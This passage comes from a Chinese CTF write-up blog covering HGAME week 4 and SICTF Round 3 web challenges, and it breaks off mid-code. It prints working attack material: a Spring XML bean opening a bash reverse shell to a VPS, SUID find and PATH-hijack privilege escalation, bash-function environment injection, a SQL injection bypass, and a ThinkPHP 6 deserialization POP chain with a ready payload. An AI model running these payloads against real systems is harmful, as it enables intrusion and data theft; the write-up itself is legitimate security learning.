31416)</span>;   <span class="hljs-comment">//另一个打不开的端口</span>OutputStream socketOutputStream = socket.get<span class="hljs-constructor">OutputStream()</span>;socketOutputStream.write(bos.<span class="hljs-keyword">to</span><span class="hljs-constructor">ByteArray()</span>);socketOutputStream.close<span class="hljs-literal">()</span>;</code></pre></div><div class="code-wrapper"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span> ?&gt;</span>    <span class="hljs-tag">&lt;<span class="hljs-name">beans</span> <span class="hljs-attr">xmlns</span>=<span class="hljs-string">&quot;http://www.springframework.org/schema/beans&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xmlns:xsi</span>=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span><span class="hljs-tag">       <span class="hljs-attr">xsi:schemaLocation</span>=<span class="hljs-string">&quot;</span></span><span class="hljs-string"><span class="hljs-tag">     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span>        <span class="hljs-tag">&lt;<span class="hljs-name">bean</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;pb&quot;</span> <span class="hljs-attr">class</span>=<span class="hljs-string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="hljs-attr">init-method</span>=<span class="hljs-string">&quot;start&quot;</span>&gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">constructor-arg</span> &gt;</span>            <span class="hljs-tag">&lt;<span class="hljs-name">list</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>bash<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>-c<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>                <span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span>&lt;![CDATA[bash -i &gt;&amp; /dev/tcp/vps_ip/port 0&gt;&amp;1]]&gt;<span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span>            <span class="hljs-tag">&lt;/<span class="hljs-name">list</span>&gt;</span>            <span class="hljs-tag">&lt;/<span class="hljs-name">constructor-arg</span>&gt;</span>        <span class="hljs-tag">&lt;/<span class="hljs-name">bean</span>&gt;</span>    <span class="hljs-tag">&lt;/<span class="hljs-name">beans</span>&gt;</span></code></pre></div><p>反弹shell后无权限读<code>/flag</code></p><p>查找suid权限 <code>find / -user root -perm -4000 -print 2&gt;/dev/null</code></p><p>发现find具有suid权限</p><div class="code-wrapper"><pre><code class="hljs bash">find / -<span class="hljs-built_in">exec</span> <span class="hljs-built_in">cat</span> /flag \; -quit</code></pre></div><h2 id="Reverse-and-Escalation-II"><a href="#Reverse-and-Escalation-II" class="headerlink" title="Reverse and Escalation.II"></a><strong>Reverse and Escalation.II</strong></h2><p>一样，一把梭反弹shell后</p><p>使用find命令发现多出点东西，于是把他dump下来分析</p><p><img src="/../images/HGAME-week4/image-20240224130536913.png" alt="image-20240224130536913"></p><p>随机数，但种子在变，一看就是要写脚本（然后就停滞了好久</p><div class="code-wrapper"><pre><code class="hljs cpp"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;string.h&gt;</span></span><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;time.h&gt;</span></span><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span>&#123;    <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v3 = <span class="hljs-built_in">time</span>(<span class="hljs-number">0LL</span>), v7, v6;    <span class="hljs-built_in">srand</span>(v3);    <span class="hljs-type">char</span> cmd[<span class="hljs-number">1024</span>];    <span class="hljs-built_in">sprintf</span>(cmd, <span class="hljs-string">&quot;/usr/bin/find &quot;</span>);    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">39</span>; ++i )&#123;        v7 = <span class="hljs-built_in">rand</span>() % <span class="hljs-number">23333</span>;        v6 = <span class="hljs-built_in">rand</span>() % <span class="hljs-number">23333</span>;        <span class="hljs-built_in">sprintf</span>(cmd + <span class="hljs-built_in">strlen</span>(cmd), <span class="hljs-string">&quot;%d &quot;</span>, v6 + v7);    &#125;    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;%s\n&quot;</span>, cmd);    <span class="hljs-built_in">system</span>(cmd);&#125;</code></pre></div><p>直接编译的话上传上去执行会显示glibc不存在</p><p>问了下Lolita大佬，编译时加上<code>--static</code>就好了，感谢Lolita大佬帮忙的脚本（我太菜了，写不对，都忘记了</p><p>然后能执行到<code>system(&#39;ls&#39;)</code>后</p><p>有做题经验的能够想到<strong>环境变量提权</strong></p><p>前提是find命令要有suid权限</p><p><code>ls -al /usr/bin/find</code>发现确实有suid权限</p><div class="code-wrapper"><pre><code class="hljs text">echo &quot;/bin/bash&quot; &gt; /tmp/lschmod 777 /tmp/lsexport PATH=/tmp:$PATH./pay      (curl上传的编译过后的文件，也记得给下执行权限哦)</code></pre></div><p><img src="/../images/HGAME-week4/image-20240224105025030.png" alt="image-20240224105025030"></p><h2 id="finally"><a href="#finally" class="headerlink" title="finally"></a>finally</h2><p>看下排名，发现有佬AK了WEB，woc真神仙（哦，好像有一题是两个flag，没事，不妨碍人家是大佬</p><p><img src="/../images/HGAME-week4/image-20240228214031034.png" alt="image-20240228214031034"></p><p>杭电人才辈出啊</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>SICTF-Round3</title>
    <link href="/2024/02/19/SICTF-Round3/"/>
    <url>/2024/02/19/SICTF-Round3/</url>
    
    <content type="html"><![CDATA[<h1 id="SICTF-Round3"><a href="#SICTF-Round3" class="headerlink" title="SICTF-Round3"></a>SICTF-Round3</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>队友好强啊，啥都会，我就只会web，有两题都没看</p><p>web 3&#x2F;7</p><p><img src="/../images/SICTF-Round3/image-20240221001812164.png" alt="image-20240221001812164"></p><p>服了，0解题熬夜狂干，CC链都写出链子了，结果tm的还不出网，限制了字数，导致我的贼大内存马打不了</p><p>试了下最近新学的回显方法，没用，比赛结束后看了出题人WP，回来复现了下</p><p>我操，我tm不知道cc链哪出了问题，没成功，换了出题人的CC3，tm的回显全都通了</p><p>我的一血啊啊啊啊啊啊啊啊啊</p><h2 id="100-upload"><a href="#100-upload" class="headerlink" title="100%_upload"></a>100%_upload</h2><p>访问看到</p><div class="code-wrapper"><pre><code class="hljs awk">http:<span class="hljs-regexp">//yu</span>anshen.life:<span class="hljs-number">39451</span>/index.php?file=upload.php</code></pre></div><p>一看就是文件包含</p><p>又有文件上传</p><p>上传个txt的马然后包含就行了</p><p><img src="/../images/SICTF-Round3/image-20240219112947864.png" alt="image-20240219112947864"></p><h2 id="Not-just-unserialize"><a href="#Not-just-unserialize" class="headerlink" title="Not just unserialize"></a>Not just unserialize</h2><p>都不算pop链了，就是绕过正则RCE</p><p>一眼环境变量RCE</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__isset</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><span class="hljs-function"></span>&#123;    <span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;get&#x27;</span>] <span class="hljs-keyword">as</span> <span class="hljs-variable">$inject</span> =&gt; <span class="hljs-variable">$rce</span>)&#123;        <span class="hljs-title function_ invoke__">putenv</span>(<span class="hljs-string">&quot;<span class="hljs-subst">&#123;$inject&#125;</span>=<span class="hljs-subst">&#123;$rce&#125;</span>&quot;</span>);    &#125;    <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;echo \&quot;Haven&#x27;t you get the secret?\&quot;&quot;</span>);&#125;</code></pre></div><p>这里有个细节就是题目描述</p><div class="code-wrapper"><pre><code class="hljs awk">看似平平无奇的反序列化题，出题人却在dockerfile里添加了这样一行奇怪命令：RUN ln -sf <span class="hljs-regexp">/bin/</span>bash <span class="hljs-regexp">/bin/</span>sh……</code></pre></div><p>可以用回车来满足正则的要求，即<code>\nworries</code></p><p><a href="http://tttang.com/archive/1450/">http://tttang.com/archive/1450/</a></p><div class="code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">get</span>[BASH_FUNC_echo%<span class="hljs-number">25</span>%<span class="hljs-number">25</span>]=()%<span class="hljs-number">20</span>&#123;%<span class="hljs-number">20</span>cat%<span class="hljs-number">20</span>/f*;%<span class="hljs-number">20</span>&#125;<span class="hljs-attribute">go</span>=Tzo1OiJzdGFydCI6Mjp7czo3OiJ3ZWxjb21lIjtPOjI6IlNFIjoxOntzOjQ6InllYXIiO086MjoiQ1IiOjI6e3M6NDoibGFzdCI7TzoyOiJFVCI6MDp7fXM6NzoibmV3eWVhciI7czo4OiIKd29ycmllcyI7fX1zOjM6InlvdSI7Tjt9</code></pre></div><p><img src="/../images/SICTF-Round3/image-20240219111109501.png" alt="image-20240219111109501"></p><h2 id="EZ-SSRF"><a href="#EZ-SSRF" class="headerlink" title="EZ-SSRF"></a>EZ-SSRF</h2><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-title function_ invoke__">highlight_file</span>(__file__);<span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"><span class="hljs-variable">$url</span></span>) </span>&#123;    <span class="hljs-variable">$curl</span> = <span class="hljs-title function_ invoke__">curl_init</span>();    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_URL, <span class="hljs-variable">$url</span>);    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_HEADER, <span class="hljs-number">0</span>);    <span class="hljs-title function_ invoke__">curl_setopt</span>(<span class="hljs-variable">$curl</span>, CURLOPT_RETURNTRANSFER, <span class="hljs-literal">true</span>);    <span class="hljs-variable">$data</span> = <span class="hljs-title function_ invoke__">curl_exec</span>(<span class="hljs-variable">$curl</span>);    <span class="hljs-title function_ invoke__">curl_close</span>(<span class="hljs-variable">$curl</span>);    <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-variable">$data</span>);    <span class="hljs-keyword">return</span> <span class="hljs-variable">$data</span>;&#125;<span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">client</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$url</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$payload</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-variable">$url</span> = <span class="hljs-string">&quot;http://127.0.0.1/&quot;</span>;        <span class="hljs-variable">$payload</span> = <span class="hljs-string">&quot;system(\&quot;cat /flag\&quot;);&quot;</span>;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Exploit&quot;</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$this</span>-&gt;url);    &#125;&#125;<span class="hljs-comment">// hint:hide other file</span><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;Harder&#x27;</span>])) &#123;    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;Harder&#x27;</span>]);&#125; <span class="hljs-keyword">else</span> &#123;    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;You don&#x27;t know how to pass parameters?&quot;</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><p><img src="/../images/SICTF-Round3/image-20240219113614991.png" alt="image-20240219113614991"></p><p>admin.php</p><div class="code-wrapper"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;flag.php&quot;</span>;<span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<span class="hljs-variable">$allowed_ip</span> = <span class="hljs-string">&quot;127.0.0.1&quot;</span>;<span class="hljs-keyword">if</span> (<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;REMOTE_ADDR&#x27;</span>] !== <span class="hljs-variable">$allowed_ip</span>) &#123;    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;You can&#x27;t get flag&quot;</span>);&#125; <span class="hljs-keyword">else</span> &#123;    <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;&#125;<span class="hljs-meta">?&gt;</span></code></pre></div><div class="code-wrapper"><pre><code class="hljs php"> <span class="hljs-meta">&lt;?php</span><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">client</span></span>&#123;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$url</span> = <span class="hljs-string">&quot;http://127.0.0.1/admin.php&quot;</span>;    <span class="hljs-keyword">public</span> <span class="hljs-variable">$payload</span> = <span class="hljs-string">&quot;system(\&quot;cat /flag\&quot;);&quot;</span>;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-variable">$url</span> = <span class="hljs-string">&quot;&quot;</span>;        <span class="hljs-variable">$payload</span> = <span class="hljs-string">&quot;system(\&quot;cat /flag\&quot;);&quot;</span>;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Exploit&quot;</span>;    &#125;    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;        <span class="hljs-title function_ invoke__">get</span>(<span class="hljs-variable">$this</span>-&gt;url);    &#125;&#125;<span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">client</span>();<span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);</code></pre></div><h3 id="晨曦WP"><a href="#晨曦WP" class="headerlink" title="晨曦WP"></a>晨曦WP</h3><p><code>file:///var/www/html/flag.php</code></p><h2 id="hacker"><a href="#hacker" class="headerlink" title="hacker *"></a>hacker *</h2><p>明显的SQL注入，但是会不了一点 （SQL真的不会啊</p><p><img src="/../images/SICTF-Round3/image-20240219174609003.png" alt="image-20240219174609003"></p><p><a href="https://blog.csdn.net/weixin_46330722/article/details/109605941">https://blog.csdn.net/weixin_46330722/article/details/109605941</a></p><p><a href="https://blog.csdn.net/weixin_46330722/article/details/109531387">https://blog.csdn.net/weixin_46330722/article/details/109531387</a></p><div class="code-wrapper"><pre><code class="hljs n1ql">username=flag&#x27;union<span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>(<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span>group_concat(<span class="hljs-symbol">`2`</span>)<span class="hljs-comment">/**/</span><span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>(<span class="hljs-keyword">select</span><span class="hljs-comment">/**/</span><span class="hljs-number">1</span>,<span class="hljs-number">2</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">union</span><span class="hljs-comment">/**/</span><span class="hljs-keyword">select</span>*<span class="hljs-keyword">from</span><span class="hljs-comment">/**/</span>flag)n)%<span class="hljs-number">23</span></code></pre></div><h2 id="Oyst3rPHP"><a href="#Oyst3rPHP" class="headerlink" title="Oyst3rPHP *"></a>Oyst3rPHP *</h2><p>一点没看，不过thinkphp6.0有现成的pop链应该不难</p><h3 id="晨曦✌WP"><a href="#晨曦✌WP" class="headerlink" title="晨曦✌WP"></a>晨曦✌WP</h3><p>thinkphp6.0*的反序列化、<code>preg_match</code>和md5的特性。</p><p>首先访问<code>/www.zip</code>，得到源码，看源码的<code>Readme.md</code>知道这是tp6。</p><p>部分源码：</p><div class="code-wrapper"><pre><code class="hljs php">PHP<span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"></span>)</span><span class="hljs-function">    </span>&#123;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;RT，一个很简单的Web，给大家送一点分,再送三只生蚝，过年一起吃生蚝哈&quot;</span>;        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=&#x27;../Oyster.png&#x27;&quot;</span>.<span class="hljs-string">&quot;/&gt;&quot;</span>;        <span class="hljs-variable">$payload</span> = <span class="hljs-title function_ invoke__">base64_decode</span>(@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;payload&#x27;</span>]);        <span class="hljs-variable">$right</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;left&#x27;</span>];        <span class="hljs-variable">$left</span> = @<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;right&#x27;</span>];        <span class="hljs-variable">$key</span> = (<span class="hljs-keyword">string</span>)@<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;key&#x27;</span>];        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$right</span> !== <span class="hljs-variable">$left</span> &amp;&amp; <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$right</span>) == <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$left</span>))&#123;            <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;Congratulations on getting your first oyster&quot;</span>;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=&#x27;../Oyster1.png&#x27;&quot;</span>.<span class="hljs-string">&quot;/&gt;&quot;</span>;            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/.+?THINKPHP/is&#x27;</span>, <span class="hljs-variable">$key</span>))&#123;                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;Oysters don&#x27;t want you to eat&quot;</span>);            &#125;            <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$key</span>, <span class="hljs-string">&#x27;603THINKPHP&#x27;</span>) === <span class="hljs-literal">false</span>)&#123;                <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;！！！Oysters don&#x27;t want you to eat！！！&quot;</span>);            &#125;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;WOW！！！Congratulations on getting your second oyster&quot;</span>;<span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;img src=&#x27;../Oyster2.png&#x27;&quot;</span>.<span class="hljs-string">&quot;/&gt;&quot;</span>;            @<span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$payload</span>);<span class="hljs-comment">//最后一个生蚝在根目录，而且里面有Flag？？？咋样去找到它呢？？？它的名字是什么？？？</span><span class="hljs-comment">//在源码的某处注释给出了提示，这就看你是不是真懂Oyst3rphp框架咯！！！</span><span class="hljs-comment">//小Tips：细狗函数┗|｀O′|┛ 嗷~~</span>        &#125;    &#125;</code></pre></div><p>这里先是md5弱比较，然后利用正则回溯最大次数上限绕过 <code>preg_match</code> ，最后是反序列化。</p><p>参考链接：<a href="https://blog.csdn.net/yourdawntown/article/details/120558237">利用正则回溯最大次数上限绕过preg_match</a></p><p>反序列化直接拿网上现成的pop链就行了。</p><div class="code-wrapper"><pre><code class="hljs php">PHP<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">model</span>\<span class="hljs-title class_">concern</span>;  <span class="hljs-class"><span class="hljs-keyword">trait</span> <span class="hljs-title">Attribute</span></span><span class="hljs-class"> </span>&#123;     <span class="hljs-keyword">private</span> <span class="hljs-variable">$data</span> = [<span class="hljs-string">&quot;key&quot;</span>=&gt;<span class="hljs-string">&quot;cat /Oyst3333333r.php&quot;</span>]; <span class="hljs-comment">// 这里填上命令</span>     <span class="hljs-keyword">private</span> <span class="hljs-variable">$withAttr</span> = [<span class="hljs-string">&quot;key&quot;</span>=&gt;<span class="hljs-string">&quot;system&quot;</span>]; &#125; <span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>; <span class="hljs-keyword">abstract</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Model</span></span><span class="hljs-class"> </span>&#123;     <span class="hljs-keyword">use</span> <span class="hljs-title">model</span>\<span class="hljs-title">concern</span>\<span class="hljs-title">Attribute</span>;     <span class="hljs-keyword">private</span> <span class="hljs-variable">$lazySave</span> = <span class="hljs-literal">true</span>;     <span class="hljs-keyword">protected</span> <span class="hljs-variable">$withEvent</span> = <span class="hljs-literal">false</span>;     <span class="hljs-keyword">private</span> <span class="hljs-variable">$exists</span> = <span class="hljs-literal">true</span>;     <span class="hljs-keyword">private</span> <span class="hljs-variable">$force</span> = <span class="hljs-literal">true</span>;     <span class="hljs-keyword">protected</span> <span class="hljs-variable">$name</span>;     <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$obj</span>=<span class="hljs-string">&quot;&quot;</span></span>)</span>&#123;         <span class="hljs-variable language_">$this</span>-&gt;name=<span class="hljs-variable">$obj</span>;     &#125; &#125; <span class="hljs-keyword">namespace</span> <span class="hljs-title class_">think</span>\<span class="hljs-title class_">model</span>; <span class="hljs-keyword">use</span> <span class="hljs-title">think</span>\<span class="hljs-title">Model</span>; <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Pivot</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">Model</span></span><span class="hljs-class"> </span>&#123;&#125; <span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Pivot</span>(); <span class="hljs-variable">$b</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Pivot</span>(<span class="hljs-variable">$a</span>); <span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$b</span>));<span class="hljs-comment">// TzoxNzoidGhpbmtcbW9kZWxcUGl2b3QiOjc6e3M6MjE6IgB0aGlua1xNb2RlbABsYXp5U2F2ZSI7YjoxO3M6MTI6IgAqAHdpdGhFdmVudCI7YjowO3M6MTk6IgB0aGlua1xNb2RlbABleGlzdHMiO2I6MTtzOjE4OiIAdGhpbmtcTW9kZWwAZm9yY2UiO2I6MTtzOjc6IgAqAG5hbWUiO086MTc6InRoaW5rXG1vZGVsXFBpdm90Ijo3OntzOjIxOiIAdGhpbmtcTW9kZWwAbGF6eVNhdmUiO2I6MTtzOjEyOiIAKgB3aXRoRXZlbnQiO2I6MDtzOjE5OiIAdGhpbmtcTW9kZWwAZXhpc3RzIjtiOjE7czoxODoiAHRoaW5rXE1vZGVsAGZvcmNlIjtiOjE7czo3OiIAKgBuYW1lIjtzOjA6IiI7czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czozOiJrZXkiO3M6MjE6ImNhdCAvT3lzdDMzMzMzMzNyLnBocCI7fXM6MjE6IgB0aGlua1xNb2RlbAB3aXRoQXR0ciI7YToxOntzOjM6ImtleSI7czo2OiJzeXN0ZW0iO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czozOiJrZXkiO3M6MjE6ImNhdCAvT3lzdDMzMzMzMzNyLnBocCI7fXM6MjE6IgB0aGlua1xNb2RlbAB3aXRoQXR0ciI7YToxOntzOjM6ImtleSI7czo2OiJzeXN0ZW0iO319</span></code></pre></div><p>因为回溯次数上限默认是 100 万，因此用python写脚本发过去。</p><div class="code-wrapper"><pre><code class="hljs stylus">PYTHONimport requestsurl = <span class="hljs-string">&quot;http://yuanshen.life:37255/?left=240610708&amp;right=s878926199a&quot;</span>data = &#123;<span class="hljs-string">&quot;key&quot;</span>:<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">1000100</span>+<span class="hljs-string">&quot;603THINKPHP&quot;</span>,<span class="hljs-string">&quot;payload&quot;</span>:<span class="hljs-string">&quot;TzoxNzoidGhpbmtcbW9kZWxcUGl2b3QiOjc6e3M6MjE6IgB0aGlua1xNb2RlbABsYXp5U2F2ZSI7YjoxO3M6MTI6IgAqAHdpdGhFdmVudCI7YjowO3M6MTk6IgB0aGlua1xNb2RlbABleGlzdHMiO2I6MTtzOjE4OiIAdGhpbmtcTW9kZWwAZm9yY2UiO2I6MTtzOjc6IgAqAG5hbWUiO086MTc6InRoaW5rXG1vZGVsXFBpdm90Ijo3OntzOjIxOiIAdGhpbmtcTW9kZWwAbGF6eVNhdmUiO2I6MTtzOjEyOiIAKgB3aXRoRXZlbnQiO2I6MDtzOjE5OiIAdGhpbmtcTW9kZWwAZXhpc3RzIjtiOjE7czoxODoiAHRoaW5rXE1vZGVsAGZvcmNlIjtiOjE7czo3OiIAKgBuYW1lIjtzOjA6IiI7czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czozOiJrZXkiO3M6MjE6ImNhdCAvT3lzdDMzMzMzMzNyLnBocCI7fXM6MjE6IgB0aGlua1xNb2RlbAB3aXRoQXR0ciI7YToxOntzOjM6ImtleSI7czo2OiJzeXN0ZW0iO319czoxNzoiAHRoaW5rXE1vZGVsAGRhdGEiO2E6MTp7czozOiJrZXkiO3M6MjE6ImNhdCAvT3lzdDMzMzMzMzNyLnBocCI7fXM6MjE6IgB0aGlua1xNb2RlbAB3aXRoQXR0ciI7YToxOntzOjM6ImtleSI7czo2OiJzeXN0ZW0iO319&quot;</span>&#125;r = requests<span class="hljs-selector-class">.post</span>(url,data)<span class="hljs-selector-class">.text</span><span class="hljs-function"><span class="hljs-title">print</span><span class="hljs-params">(r)</span></span></code></pre></div><p><img src="/../images/SICTF-Round3/image-20240219175337653.png" alt="image-20240219175337653"></p><h2 id="进阶-elInjection"><a href="#进阶-elInjection" class="headerlink" title="[进阶]elInjection *"></a>[进阶]elInjection *</h2><p>EL表达式，提示很多，目标很明确，但就是没写出来（很烦</p><p>赛后看了下别人的WP，回来再修改一下原来的做法，发现又被Runtime的exec给坑了</p><p>以后见到exec，里面就用base64</p><p><img src="/../images/SICTF-Round3/image-20240220224751404.png" alt="image-20240220224751404"></p><p>黑名单</p><div class="code-wrapper"><pre><code class="hljs routeros">list.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;Runtime&quot;</span>);list.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;exec&quot;</span>);list.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;invoke&quot;</span>);list.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;exec&quot;</span>);list.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;Process&quot;</span>);list.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;ClassLoader&quot;</span>);list.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;load&quot;</span>);list.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;Response&quot;</span>);list.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;Request&quot;</span>);list.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;Base64Utils&quot;</span>);list.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;ReflectUtils&quot;</span>);list.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;getWriter&quot;</span>);list.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;Thread&quot;</span>);list.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;defineClass&quot;</span>);list.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;bcel&quot;</span>);list.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;RequestAttributes&quot;</span>);list.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;File&quot;</span>);list.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;flag&quot;</span>);list.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;URL&quot;</span>);list.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;Command&quot;</span>);list.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;Inet&quot;</span>);list.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;System&quot;</span>);list.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;\\u&quot;</span>);list.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;\\x&quot;</span>);list.<span class="hljs-built_in">add</span>(<span class="hljs-string">&quot;&#x27;&quot;</span>);</code></pre></div><h3 id="我的做法"><a href="#我的做法" class="headerlink" title="我的做法"></a>我的做法</h3><p>利用ScriptEngineManager获取js，利用js的<code>String.fromCharCode</code>进行绕过</p><div class="code-wrapper"><pre><code 